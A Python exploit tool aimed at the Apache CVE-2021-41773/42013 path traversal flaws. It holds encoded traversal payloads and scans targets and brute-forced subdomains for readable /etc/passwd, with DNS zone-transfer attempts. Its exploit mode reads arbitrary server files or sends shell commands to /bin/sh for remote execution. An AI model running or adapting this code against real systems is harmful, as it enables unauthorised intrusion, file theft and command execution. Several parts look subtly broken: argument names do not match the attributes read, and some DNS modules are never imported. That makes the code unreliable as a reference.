import argparse
import http.client
import ssl
import sys
import socket
import os
import logging
import shlex
import re
import hashlib
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from typing import Optional, Tuple, List, Set, Dict, Any
from dataclasses import dataclass, asdict, field
from enum import Enum
from pathlib import Path
from datetime import datetime
import time
import dns.resolver
import dns.exception

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class DetectionConfidence(Enum):
    CRITICAL = 100
    HIGH = 85
    MEDIUM = 60
    LOW = 30
    UNCERTAIN = 0

class VulnerabilityStatus(Enum):
    VULNERABLE = "VULNERABLE"
    NOT_VULNERABLE = "NOT_VULNERABLE"
    UNCERTAIN = "UNCERTAIN"
    UNREACHABLE = "UNREACHABLE"

@dataclass
class PasswdAnalysis:
    found_root_entry: bool
    entry_count: int
    uid_zero_count: int
    valid_entries: List[str] = field(default_factory=list)
    hash_value: str = ""
    
    def calculate_hash(self, content: str) -> None:
        self.hash_value = hashlib.sha256(content.encode()).hexdigest()

@dataclass
class SystemInfoAnalysis:
    found_shell_access: bool
    found_common_paths: bool
    path_list: List[str] = field(default_factory=list)
    common_executables: List[str] = field(default_factory=list)

@dataclass
class VulnerabilityDetection:
    is_vulnerable: bool
    confidence_score: float
    evidence: List[str]
    bypassed_traversals: List[str]
    response_time_ms: float
    response_hash: str
    detection_method: str
    false_positive_indicators: List[str]
    false_negative_risk: float

@dataclass
class ScanResult:
    host: str
    port: int
    scheme: str
    variant: str
    traversal: str
    status: Optional[int]
    body: str
    error: Optional[str]
    vulnerability: VulnerabilityDetection
    response_headers: Dict[str, str] = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    is_subdomain: bool = False

@dataclass
class DNSRecord:
    domain: str
    record_type: str
    value: str
    ttl: int

class CVETraversalPayload:
    TRAVERSALS = [
        ("41773", "/cgi-bin/.%2e/%2e%2e/%2e%2e"),
        ("41773", "/.%2e/%2e%2e/%2e%2e"),
        ("42013", "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"),
        ("42013", "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"),
    ]
    
    ALTERNATE_TRAVERSALS = [
        "/cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e",
        "/.%%2e/%%2e%%2e/%%2e%%2e",
        "/cgi-bin/%2e%2e/%2e%2e",
        "/cgi-bin/..%252f..%252f",
    ]
    
    PASSWD_PATTERN = re.compile(r'^([a-z_][a-z0-9_-]{0,31}):([x*!]{1}):(\d+):(\d+)', re.MULTILINE | re.IGNORECASE)
    SHADOW_PATTERN = re.compile(r'^([a-z_][a-z0-9_-]{0,31}):\$[0-9a-z$./]{20,}', re.MULTILINE | re.IGNORECASE)
    COMMON_PATHS = ['/etc/passwd', '/etc/hosts', '/proc/version', '/etc/issue', '/proc/cpuinfo']

class ColorOutput:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

class DNSEnumerator:
    COMMON_SUBDOMAINS = [
        "www", "api", "dev", "staging", "test", "uat", "qa", "portal", "app",
        "admin", "web", "intranet", "vpn", "mail", "cdn", "static", "assets",
        "beta", "demo", "preprod", "prod", "git", "jenkins", "grafana", "backup",
        "old", "new", "tmp", "temp", "debug", "internal", "external", "secure",
        "cloud", "docker", "kubernetes", "db", "database", "redis", "cache",
        "elasticsearch", "kibana", "prometheus", "grafana", "alertmanager",
    ]
    
    def __init__(self, timeout: float = 5):
        self.timeout = timeout
        self.resolver = dns.resolver.Resolver()
        self.resolver.timeout = timeout
        self.resolver.lifetime = timeout
    
    def enumerate_subdomains(self, domain: str) -> List[str]:
        discovered = set()
        
        discovered.update(self._brute_force_subdomains(domain))
        discovered.update(self._zone_transfer_attempt(domain))
        discovered.update(self._wildcard_detection(domain))
        
        return list(discovered)
    
    def _brute_force_subdomains(self, domain: str) -> Set[str]:
        discovered = set()
        
        for subdomain in self.COMMON_SUBDOMAINS:
            candidate = f"{subdomain}.{domain}"
            try:
                answers = self.resolver.resolve(candidate, 'A')
                for rdata in answers:
                    discovered.add(candidate)
                    logger.debug(f"Discovered subdomain: {candidate} -> {rdata}")
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout, Exception):
                pass
        
        return discovered
    
    def _zone_transfer_attempt(self, domain: str) -> Set[str]:
        discovered = set()
        
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(domain, []))
            for name, node in zone.items():
                full_name = f"{name}.{domain}".rstrip('.')
                if full_name != domain:
                    discovered.add(full_name)
                    logger.debug(f"Zone transfer discovered: {full_name}")
        except Exception:
            pass
        
        return discovered
    
    def _wildcard_detection(self, domain: str) -> Set[str]:
        discovered = set()
        
        random_subdomain = f"xn--{''.join(str(i) for i in range(10))}.{domain}"
        try:
            self.resolver.resolve(random_subdomain, 'A')
            logger.debug(f"Wildcard DNS detected for {domain}")
        except (dns.resolver.NXDOMAIN, dns.exception.Timeout):
            pass
        
        return discovered

class HTTPClient:
    def __init__(self, timeout: float = 15, verify_ssl: bool = False, retries: int = 2):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.retries = retries
    
    def request(
        self,
        host: str,
        port: int,
        tls: bool,
        path: str,
        method: str = "GET",
        body: Optional[str] = None,
        headers: Optional[dict] = None,
        follow_redirects: bool = False
    ) -> Tuple[Optional[int], str, Optional[str], Dict[str, str], float]:
        
        if not self._validate_host(host) or not self._validate_port(port):
            return None, "", "invalid-input", {}, 0
        
        start_time = time.time()
        
        for attempt in range(self.retries):
            try:
                if tls:
                    context = ssl.create_default_context() if self.verify_ssl else ssl._create_unverified_context()
                    conn = http.client.HTTPSConnection(
                        host,
                        port,
                        context=context,
                        timeout=self.timeout
                    )
                else:
                    conn = http.client.HTTPConnection(host, port, timeout=self.timeout)
                
                request_headers = headers or {}
                request_headers.setdefault('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
                request_headers.setdefault('Accept', '*/*')
                
                conn.request(method, path, body=body, headers=request_headers)
                response = conn.getresponse()
                
                response_headers = dict(response.getheaders())
                data = response.read()
                conn.close()
                
                elapsed_ms = (time.time() - start_time) * 1000
                
                return response.status, data.decode("utf-8", "ignore"), None, response_headers, elapsed_ms
            
            except socket.timeout:
                if attempt == self.retries - 1:
                    return None, "", "timeout", {}, (time.time() - start_time) * 1000
            except ssl.SSLError as e:
                if attempt == self.retries - 1:
                    return None, "", f"ssl-error: {str(e)[:50]}", {}, (time.time() - start_time) * 1000
            except socket.gaierror:
                return None, "", "dns-fail", {}, (time.time() - start_time) * 1000
            except ConnectionRefusedError:
                return None, "", "refused", {}, (time.time() - start_time) * 1000
            except Exception as e:
                if attempt == self.retries - 1:
                    return None, "", f"{type(e).__name__}: {str(e)[:50]}", {}, (time.time() - start_time) * 1000
            
            time.sleep(0.5 ** attempt)
        
        return None, "", "unknown-error", {}, (time.time() - start_time) * 1000
    
    @staticmethod
    def _validate_host(host: str) -> bool:
        if not host or len(host) > 253:
            return False
        
        if not all(c.isalnum() or c in '.-' for c in host):
            return False
        
        return True
    
    @staticmethod
    def _validate_port(port: int) -> bool:
        return 1 <= port <= 65535

class PasswdAnalyzer:
    @staticmethod
    def analyze(content: str) -> PasswdAnalysis:
        analysis = PasswdAnalysis(
            found_root_entry=False,
            entry_count=0,
            uid_zero_count=0
        )
        
        analysis.calculate_hash(content)
        
        if not content or len(content) < 20:
            return analysis
        
        lines = content.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            match = CVETraversalPayload.PASSWD_PATTERN.match(line)
            if match:
                username, passwd_field, uid, gid = match.groups()
                analysis.valid_entries.append(line)
                analysis.entry_count += 1
                
                try:
                    uid_int = int(uid)
                    if uid_int == 0:
                        analysis.uid_zero_count += 1
                        if username == 'root':
                            analysis.found_root_entry = True
                except ValueError:
                    pass
        
        return analysis

class ResponseAnalyzer:
    @staticmethod
    def analyze_response(
        status: Optional[int],
        body: str,
        headers: Dict[str, str],
        response_time_ms: float
    ) -> VulnerabilityDetection:
        
        evidence = []
        bypassed_traversals = []
        false_positive_indicators = []
        confidence_score = 0.0
        is_vulnerable = False
        detection_method = ""
        
        if status is None:
            return VulnerabilityDetection(
                is_vulnerable=False,
                confidence_score=0,
                evidence=["Target unreachable"],
                bypassed_traversals=[],
                response_time_ms=response_time_ms,
                response_hash=hashlib.sha256(b"").hexdigest(),
                detection_method="unreachable",
                false_positive_indicators=[],
                false_negative_risk=0.8
            )
        
        if status != 200:
            false_positive_indicators.append(f"HTTP {status} (not 200)")
            return VulnerabilityDetection(
                is_vulnerable=False,
                confidence_score=5,
                evidence=[f"HTTP status {status}"],
                bypassed_traversals=[],
                response_time_ms=response_time_ms,
                response_hash=hashlib.sha256(body.encode()).hexdigest(),
                detection_method="http_status",
                false_positive_indicators=false_positive_indicators,
                false_negative_risk=0.1
            )
        
        if len(body) < 50:
            false_positive_indicators.append("Response too small")
            return VulnerabilityDetection(
                is_vulnerable=False,
                confidence_score=10,
                evidence=["Unusually small response body"],
                bypassed_traversals=[],
                response_time_ms=response_time_ms,
                response_hash=hashlib.sha256(body.encode()).hexdigest(),
                detection_method="body_size",
                false_positive_indicators=false_positive_indicators,
                false_negative_risk=0.5
            )
        
        passwd_analysis = PasswdAnalyzer.analyze(body)
        
        if passwd_analysis.found_root_entry and passwd_analysis.entry_count >= 5:
            evidence.append(f"Found {passwd_analysis.entry_count} valid /etc/passwd entries")
            evidence.append(f"Root entry detected with UID 0")
            confidence_score += 45
            detection_method = "passwd_analysis"
        
        if passwd_analysis.uid_zero_count >= 1:
            evidence.append(f"Found {passwd_analysis.uid_zero_count} UID:0 entries")
            confidence_score += 20
        
        if CVETraversalPayload.SHADOW_PATTERN.search(body):
            evidence.append("Shadow file format detected (password hashes)")
            confidence_score += 15
            detection_method = "shadow_analysis"
        
        if 'bin/bash' in body or 'bin/sh' in body or 'bin/nologin' in body:
            evidence.append("Shell paths detected in response")
            confidence_score += 10
        
        common_passwd_indicators = ['daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news']
        found_indicators = sum(1 for indicator in common_passwd_indicators if indicator in body)
        
        if found_indicators >= 3:
            evidence.append(f"Found {found_indicators} common /etc/passwd account names")
            confidence_score += 15
        
        if response_time_ms < 50:
            false_positive_indicators.append("Suspiciously fast response (possible cached/dummy data)")
            confidence_score *= 0.7
        
        if passwd_analysis.entry_count == 0 and status == 200:
            false_positive_indicators.append("HTTP 200 but no valid passwd entries")
            confidence_score = max(0, confidence_score - 30)
        
        is_vulnerable = confidence_score >= 60
        false_negative_risk = max(0, 1.0 - (confidence_score / 100))
        
        response_hash = hashlib.sha256(body.encode()).hexdigest()
        
        return VulnerabilityDetection(
            is_vulnerable=is_vulnerable,
            confidence_score=min(100, confidence_score),
            evidence=evidence,
            bypassed_traversals=bypassed_traversals,
            response_time_ms=response_time_ms,
            response_hash=response_hash,
            detection_method=detection_method,
            false_positive_indicators=false_positive_indicators,
            false_negative_risk=false_negative_risk
        )

class CVEScannerAPI:
    def __init__(self, http_client: HTTPClient, response_analyzer: ResponseAnalyzer):
        self.http_client = http_client
        self.response_analyzer = response_analyzer
        self.scan_cache = {}
    
    def scan_target(
        self,
        host: str,
        port: int,
        scheme: str,
        is_subdomain: bool = False
    ) -> Tuple[bool, List[ScanResult]]:
        
        cache_key = f"{scheme}://{host}:{port}"
        if cache_key in self.scan_cache:
            return self.scan_cache[cache_key]
        
        tls = scheme == "https"
        results = []
        reachable = False
        any_vulnerable = False
        
        for variant, traversal in CVETraversalPayload.TRAVERSALS:
            status, body, error, headers, response_time = self.http_client.request(
                host,
                port,
                tls,
                traversal + "/etc/passwd"
            )
            
            if status is not None:
                reachable = True
            
            vulnerability = self.response_analyzer.analyze_response(
                status,
                body,
                headers,
                response_time
            )
            
            result = ScanResult(
                host=host,
                port=port,
                scheme=scheme,
                variant=variant,
                traversal=traversal,
                status=status,
                body=body,
                error=error,
                vulnerability=vulnerability,
                response_headers=headers,
                is_subdomain=is_subdomain
            )
            results.append(result)
            
            if vulnerability.is_vulnerable:
                any_vulnerable = True
        
        self.scan_cache[cache_key] = (reachable, results)
        return reachable, results
    
    def scan_target_deep(
        self,
        host: str,
        port: int,
        scheme: str,
        is_subdomain: bool = False
    ) -> Tuple[bool, List[ScanResult]]:
        
        tls = scheme == "https"
        results = []
        reachable = False
        
        all_traversals = CVETraversalPayload.TRAVERSALS + list(
            (str(i), trav) for i, trav in enumerate(CVETraversalPayload.ALTERNATE_TRAVERSALS, 1)
        )
        
        for variant, traversal in all_traversals:
            status, body, error, headers, response_time = self.http_client.request(
                host,
                port,
                tls,
                traversal + "/etc/passwd"
            )
            
            if status is not None:
                reachable = True
            
            vulnerability = self.response_analyzer.analyze_response(
                status,
                body,
                headers,
                response_time
            )
            
            result = ScanResult(
                host=host,
                port=port,
                scheme=scheme,
                variant=variant,
                traversal=traversal,
                status=status,
                body=body,
                error=error,
                vulnerability=vulnerability,
                response_headers=headers,
                is_subdomain=is_subdomain
            )
            results.append(result)
        
        return reachable, results
    
    def validate_vulnerability(self, results: List[ScanResult]) -> bool:
        
        vulnerable_count = sum(1 for r in results if r.vulnerability.is_vulnerable)
        
        if vulnerable_count == 0:
            return False
        
        high_confidence = sum(
            1 for r in results
            if r.vulnerability.is_vulnerable and r.vulnerability.confidence_score >= 80
        )
        
        if high_confidence > 0:
            return True
        
        response_hashes = set()
        for r in results:
            if r.vulnerability.is_vulnerable:
                response_hashes.add(r.vulnerability.response_hash)
        
        if len(response_hashes) == 1:
            return True
        
        avg_confidence = sum(
            r.vulnerability.confidence_score for r in results
            if r.vulnerability.is_vulnerable
        ) / vulnerable_count
        
        return avg_confidence >= 65

class InputValidator:
    @staticmethod
    def validate_file_path(file_path: str) -> bool:
        try:
            path = Path(file_path)
            return path.is_absolute() and path.exists() and path.is_file()
        except (ValueError, OSError):
            return False
    
    @staticmethod
    def validate_command(cmd: str) -> bool:
        if not cmd or len(cmd) > 2048:
            return False
        
        forbidden_patterns = [r'[\x00-\x1f]']
        
        for pattern in forbidden_patterns:
            if re.search(pattern, cmd):
                return False
        
        return True
    
    @staticmethod
    def sanitize_command(cmd: str) -> str:
        return shlex.quote(cmd)
    
    @staticmethod
    def validate_subdomain_file(file_path: str) -> bool:
        try:
            return Path(file_path).is_file() and Path(file_path).stat().st_size < 50 * 1024 * 1024
        except (ValueError, OSError):
            return False

class SubdomainGenerator:
    DEFAULT_SUBDOMAINS = [
        "www", "api", "dev", "staging", "test", "uat", "qa", "portal", "app",
        "admin", "web", "intranet", "vpn", "mail", "cdn", "static", "assets",
        "beta", "demo", "preprod", "prod", "git", "jenkins", "grafana", "backup",
        "old", "new", "tmp", "temp", "debug", "internal", "external", "secure",
        "cloud", "docker", "kubernetes", "db", "database", "redis", "cache",
    ]
    
    @classmethod
    def generate(cls, domain: str, custom_file: Optional[str] = None, use_dns: bool = False) -> List[str]:
        subdomains_set = set(cls.DEFAULT_SUBDOMAINS)
        
        if custom_file and InputValidator.validate_subdomain_file(custom_file):
            try:
                with open(custom_file, 'r', encoding='utf-8', errors='ignore') as f:
                    custom = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    subdomains_set.update(custom)
            except Exception as e:
                logger.warning(f"Failed to read subdomain file: {e}")
        
        if use_dns:
            try:
                dns_enum = DNSEnumerator()
                dns_discovered = dns_enum.enumerate_subdomains(domain)
                subdomains_set.update(dns_discovered)
                logger.info(f"DNS enumeration discovered {len(dns_discovered)} subdomains")
            except Exception as e:
                logger.warning(f"DNS enumeration failed: {e}")
        
        parts = domain.split('.')
        base = '.'.join(parts[-2:]) if len(parts) >= 2 else domain
        
        results = set()
        for sub in subdomains_set:
            if sub and all(c.isalnum() or c == '-' for c in sub):
                candidate = f"{sub}.{base}"
                if candidate != base:
                    results.add(candidate)
        
        return list(results)

class TargetBuilder:
    @staticmethod
    def parse_target(raw: str) -> Optional[Tuple[str, str, Optional[int]]]:
        try:
            if '://' not in raw:
                raw = f"//{raw}"
            
            parsed = urlparse(raw)
            
            if not parsed.hostname:
                return None
            
            scheme = parsed.scheme or "https"
            host = parsed.hostname
            port = parsed.port
            
            return scheme, host, port
        except Exception as e:
            logger.error(f"Failed to parse target {raw}: {e}")
            return None
    
    @staticmethod
    def build_targets(
        raw: str,
        with_subdomains: bool = False,
        subdomain_file: Optional[str] = None,
        force_scheme: Optional[str] = None,
        use_dns: bool = False
    ) -> List[Tuple[str, str, int, bool]]:
        
        parsed = TargetBuilder.parse_target(raw)
        if not parsed:
            return []
        
        scheme, host, port = parsed
        
        if force_scheme:
            schemes = [force_scheme]
        elif scheme:
            schemes = [scheme]
        else:
            schemes = ["https", "http"]
        
        hosts = [(host, False)]
        
        if with_subdomains:
            generated = SubdomainGenerator.generate(host, subdomain_file, use_dns)
            hosts.extend([(h, True) for h in generated if h != host])
        
        targets = []
        for h, is_subdomain in hosts:
            for s in schemes:
                default_port = 443 if s == "https" else 80
                targets.append((s, h, port or default_port, is_subdomain))
        
        return targets
    
    @staticmethod
    def gather_targets(args) -> List[Tuple[str, str, int, bool]]:
        targets = []
        
        if args.url:
            targets.extend(TargetBuilder.build_targets(
                args.url,
                args.s,
                args.w,
                args.m,
                args.e
            ))
        
        if args.list:
            if not Path(args.list).is_file():
                logger.error(f"Target list file not found: {args.list}")
                raise SystemExit(1)
            
            try:
                with open(args.list, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            targets.extend(TargetBuilder.build_targets(
                                line,
                                args.s,
                                args.w,
                                args.m,
                                args.e
                            ))
            except Exception as e:
                logger.error(f"Failed to read target list: {e}")
                raise SystemExit(1)
        
        seen = set()
        unique = []
        for target in targets:
            target_key = (target[0], target[1], target[2])
            if target_key not in seen:
                seen.add(target_key)
                unique.append(target)
        
        return unique

class OutputFormatter:
    @staticmethod
    def format_confidence(score: float) -> str:
        if score >= 85:
            return f"{ColorOutput.GREEN}{score:.0f}%{ColorOutput.RESET}"
        elif score >= 60:
            return f"{ColorOutput.YELLOW}{score:.0f}%{ColorOutput.RESET}"
        else:
            return f"{ColorOutput.RED}{score:.0f}%{ColorOutput.RESET}"
    
    @staticmethod
    def format_status(result: ScanResult) -> str:
        vuln = result.vulnerability
        
        if vuln.is_vulnerable:
            return f"{ColorOutput.GREEN}VULNERABLE{ColorOutput.RESET} (confidence: {OutputFormatter.format_confidence(vuln.confidence_score)})"
        
        if result.status is None:
            return f"{ColorOutput.RED}UNREACHABLE{ColorOutput.RESET} ({result.error})"
        
        if result.status == 200:
            indicators = len(vuln.false_positive_indicators)
            if indicators > 0:
                return f"{ColorOutput.YELLOW}SUSPICIOUS{ColorOutput.RESET} (HTTP 200 but {indicators} false positive indicators)"
            return f"{ColorOutput.YELLOW}HTTP 200{ColorOutput.RESET} (low confidence: {OutputFormatter.format_confidence(vuln.confidence_score)})"
        
        if result.status == 401:
            return f"{ColorOutput.YELLOW}PROTECTED{ColorOutput.RESET} (401 Unauthorized)"
        
        if result.status == 403:
            return f"{ColorOutput.YELLOW}FORBIDDEN{ColorOutput.RESET}"
        
        if result.status == 404:
            return "NOT FOUND"
        
        if result.status >= 500:
            return f"{ColorOutput.RED}SERVER ERROR{ColorOutput.RESET} ({result.status})"
        
        return f"HTTP {result.status}"
    
    @staticmethod
    def print_host(scheme: str, host: str, port: int, results: List[ScanResult], is_subdomain: bool = False) -> None:
        is_vulnerable = any(r.vulnerability.is_vulnerable for r in results)
        default_port = 443 if scheme == "https" else 80
        
        url = f"{scheme}://{host}"
        if port != default_port:
            url += f":{port}"
        
        if is_subdomain:
            url += f" {ColorOutput.DIM}[subdomain]{ColorOutput.RESET}"
        
        tag = f"{ColorOutput.GREEN}[VULN]{ColorOutput.RESET}" if is_vulnerable else f"{ColorOutput.CYAN}[*]{ColorOutput.RESET}"
        print(f"\n{tag} {ColorOutput.BOLD}{url}{ColorOutput.RESET}")
        
        for result in results:
            if result.vulnerability.is_vulnerable or result.status == 200:
                code = str(result.status) if result.status is not None else (result.error or "ERR")
                status_label = OutputFormatter.format_status(result)
                
                print(f"    [{code}] CVE-2021-{result.variant} {ColorOutput.DIM}{result.traversal}{ColorOutput.RESET}")
                print(f"        Status: {status_label}")
                
                if result.vulnerability.evidence:
                    for evidence in result.vulnerability.evidence:
                        print(f"        Evidence: {evidence}")
                
                if result.vulnerability.false_positive_indicators:
                    for indicator in result.vulnerability.false_positive_indicators:
                        print(f"        Note: {indicator}")
                
                print(f"        Response Time: {result.vulnerability.response_time_ms:.2f}ms")

class CVEScanner:
    def __init__(self, args):
        self.args = args
        self.http_client = HTTPClient(
            timeout=args.o,
            verify_ssl=args.v,
            retries=args.retries
        )
        self.response_analyzer = ResponseAnalyzer()
        self.scanner_api = CVEScannerAPI(self.http_client, self.response_analyzer)
    
    def run_check(self) -> None:
        targets = TargetBuilder.gather_targets(self.args)
        
        if not targets:
            logger.error("No targets specified. Use -u or -l")
            raise SystemExit(1)
        
        print(f"\n{ColorOutput.CYAN}[*] Scanning {len(targets)} target(s){ColorOutput.RESET}")
        print(f"{ColorOutput.DIM}Mode: {'DEEP' if self.args.d else 'STANDARD'} | SSL Verify: {self.args.v} | Threads: {self.args.threads}{ColorOutput.RESET}\n")
        
        vulnerabilities = []
        suspicious = []
        unreachable = []
        
        with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            futures = {}
            
            for scheme, host, port, is_subdomain in targets:
                if self.args.d:
                    future = executor.submit(
                        self.scanner_api.scan_target_deep,
                        host, port, scheme, is_subdomain
                    )
                else:
                    future = executor.submit(
                        self.scanner_api.scan_target,
                        host, port, scheme, is_subdomain
                    )
                futures[future] = (scheme, host, port, is_subdomain)
            
            for future in as_completed(futures):
                scheme, host, port, is_subdomain = futures[future]
                
                try:
                    reachable, results = future.result()
                except Exception as e:
                    logger.error(f"Scan failed for {scheme}://{host}:{port}: {e}")
                    unreachable.append(f"{scheme}://{host}:{port}")
                    continue
                
                if reachable:
                    if any(r.vulnerability.is_vulnerable for r in results):
                        is_truly_vulnerable = self.scanner_api.validate_vulnerability(results)
                        if is_truly_vulnerable:
                            OutputFormatter.print_host(scheme, host, port, results, is_subdomain)
                            vulnerabilities.append(f"{scheme}://{host}:{port}")
                        else:
                            logger.debug(f"False positive eliminated: {scheme}://{host}:{port}")
                    elif any(r.status == 200 for r in results):
                        OutputFormatter.print_host(scheme, host, port, results, is_subdomain)
                        suspicious.append(f"{scheme}://{host}:{port}")
        
        print(f"\n{ColorOutput.BOLD}=== SCAN SUMMARY ==={ColorOutput.RESET}")
        print(f"{ColorOutput.GREEN}[+] Vulnerable: {len(vulnerabilities)}{ColorOutput.RESET}")
        for vuln in vulnerabilities:
            print(f"    {ColorOutput.GREEN}✓{ColorOutput.RESET} {vuln}")
        
        print(f"{ColorOutput.YELLOW}[!] Suspicious: {len(suspicious)}{ColorOutput.RESET}")
        for susp in suspicious:
            print(f"    {ColorOutput.YELLOW}?{ColorOutput.RESET} {susp}")
        
        print(f"{ColorOutput.RED}[✗] Unreachable: {len(unreachable)}{ColorOutput.RESET}")
        print(f"{ColorOutput.CYAN}[*] Scan completed in {datetime.utcnow().isoformat()}{ColorOutput.RESET}")
    
    def run_exploit(self) -> None:
        if not self.args.url:
            logger.error("Target URL required (-u)")
            raise SystemExit(1)
        
        parsed = TargetBuilder.parse_target(self.args.url)
        if not parsed:
            logger.error("Failed to parse target URL")
            raise SystemExit(1)
        
        scheme, host, port = parsed
        default_port = 443 if scheme == "https" else 80
        port = port or default_port
        
        print(f"{ColorOutput.CYAN}[*] Probing target: {scheme}://{host}:{port}{ColorOutput.RESET}\n")
        
        reachable, results = self.scanner_api.scan_target(host, port, scheme)
        
        if not reachable:
            logger.error("Target is unreachable")
            raise SystemExit(1)
        
        vulnerable_results = [r for r in results if r.vulnerability.is_vulnerable]
        
        if not vulnerable_results:
            print(f"{ColorOutput.RED}[✗] Target does not appear vulnerable{ColorOutput.RESET}")
            raise SystemExit(1)
        
        best_result = max(vulnerable_results, key=lambda r: r.vulnerability.confidence_score)
        
        print(f"{ColorOutput.GREEN}[+] Target is VULNERABLE{ColorOutput.RESET}")
        print(f"    CVE-2021-{best_result.variant}")
        print(f"    Payload: {best_result.traversal}")
        print(f"    Confidence: {OutputFormatter.format_confidence(best_result.vulnerability.confidence_score)}\n")
        
        tls = scheme == "https"
        
        if self.args.f:
            if not InputValidator.validate_file_path(self.args.f):
                logger.error(f"Invalid file path: {self.args.f}")
                raise SystemExit(1)
            
            print(f"{ColorOutput.CYAN}[*] Reading file: {self.args.f}{ColorOutput.RESET}")
            status, body, error, _, _ = self.http_client.request(
                host,
                port,
                tls,
                best_result.traversal + self.args.f
            )
        
        elif self.args.x:
            if not InputValidator.validate_command(self.args.x):
                logger.error("Invalid command")
                raise SystemExit(1)
            
            sanitized_cmd = InputValidator.sanitize_command(self.args.x)
            payload = f"echo Content-Type: text/plain; echo; {sanitized_cmd}"
            
            print(f"{ColorOutput.CYAN}[*] Executing command: {self.args.x}{ColorOutput.RESET}\n")
            
            status, body, error, _, _ = self.http_client.request(
                host,
                port,
                tls,
                best_result.traversal + "/bin/sh",
                method="POST",
                body=payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
        
        else:
            status, body, error, _, _ = self.http_client.request(
                host,
                port,
                tls,
                best_result.traversal + "/etc/passwd"
            )
        
        print(f"{ColorOutput.GREEN}[+] Response:{ColorOutput.RESET}")
        print(f"Status: {status}")
        print(f"\n{body}")

def create_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="CVE-2021-41773/42013 Apache Scanner with DNS Enumeration and Multi-Layer Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    target_group = parser.add_argument_group("Target Options")
    target_group.add_argument("-u", "-url", help="Target URL or domain")
    target_group.add_argument("-l", "-list", help="File with targets (one per line)")
    
    scan_group = parser.add_argument_group("Scan Options")
    scan_group.add_argument("-c", "-check", action="store_true", help="Run in scan mode")
    scan_group.add_argument("-s", "-subdomains", action="store_true", help="Enumerate and scan subdomains")
    scan_group.add_argument("-e", "-enum", action="store_true", help="Use DNS-based subdomain enumeration")
    scan_group.add_argument("-w", "-wordlist", help="Custom subdomain wordlist")
    scan_group.add_argument("-m", "-method", choices=["http", "https"], help="Force HTTP scheme")
    scan_group.add_argument("-d", "-deep", action="store_true", help="Deep scan with alternate traversals")
    
    exploit_group = parser.add_argument_group("Exploit Options")
    exploit_group.add_argument("-f", "-file", help="Absolute file path to read")
    exploit_group.add_argument("-x", "-exec", help="Command to execute")
    
    perf_group = parser.add_argument_group("Performance Options")
    perf_group.add_argument("-t", "-threads", type=int, default=20, help="Thread pool size")
    perf_group.add_argument("-o", "-timeout", type=float, default=15, help="Request timeout (seconds)")
    perf_group.add_argument("-r", "-retries", type=int, default=2, help="Retry attempts per target")
    
    security_group = parser.add_argument_group("Security Options")
    security_group.add_argument("-v", "-verify", action="store_true", help="Verify SSL certificates")
    
    return parser

def main():
    parser = create_parser()
    args = parser.parse_args()
    
    if not args.u and not args.l:
        parser.print_help()
        raise SystemExit("Target required: -u or -l")
    
    scanner = CVEScanner(args)
    
    try:
        if args.c:
            scanner.run_check()
        else:
            scanner.run_exploit() if (args.u or args.l) else parser.print_help()
    except KeyboardInterrupt:
        logger.info("Operation interrupted by user")
        raise SystemExit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        raise SystemExit(1)

if __name__ == "__main__":
    main()
